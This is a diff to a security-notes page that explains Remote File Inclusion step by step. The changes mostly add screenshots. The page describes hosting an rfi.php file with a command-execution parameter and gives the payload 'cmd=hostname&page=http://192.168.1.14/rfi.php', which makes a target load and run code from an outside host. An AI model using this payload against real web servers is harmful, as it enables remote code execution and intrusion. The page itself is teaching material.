@@ -35,13 +35,69 @@ Remote File Inclusion allows an attacker to run malicious code on the vulnerable
 
 1. Identify the parameter that accepts file or URL as input.
 
+
+
+
+
+![1b538b66-34bf-4383-89a7-5c9e3b3ea226.jpg](_assets/images/Mash/1b538b66-34bf-4383-89a7-5c9e3b3ea226.jpg)
+
+
+
+
+
 2. Host a page with malicious code as shown below. The *rfi.php* file contains *phpinfo()* function, which reveals the php information. There is also a command parameter that accepts system command as input and executes on the server.
+
+
+
+
+
+
+
+![40e17f06-afad-4859-ae85-8ca713f63b80.jpg](_assets/images/Mash/40e17f06-afad-4859-ae85-8ca713f63b80.jpg)
+
+
 
 3. The *rfi.php* file is hosted on a server and it can be accessed using the URL *http://192.168.1.14/rfi.php*. The URL is passed as input to the page parameter along with command (*cmd*) as shown in the below image. 
 
+
+
 Payload: *cmd=hostname&page=http://192.168.1.14/rfi.php*
 
+
+
+![5ac278b7-1112-4cd3-bb0d-2b8a98cded9b.jpg](_assets/images/Mash/5ac278b7-1112-4cd3-bb0d-2b8a98cded9b.jpg)
+
+
+
+
+
 4. Web server parses the contents of *rfi.php* file and executes the *phpinfo()* function along with the *hostname* command.
+
+
+
+
+
+
+
+![b7e5cc21-282b-47f7-ac9e-5973b88e3a09.jpg](_assets/images/Mash/b7e5cc21-282b-47f7-ac9e-5973b88e3a09.jpg)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 ## Platforms
 
@@ -53,3 +109,5 @@ Payload: *cmd=hostname&page=http://192.168.1.14/rfi.php*
 - [[Remote File Inclusion]]
 - [[RFI]]
 - [[Web Applications]]
+
+
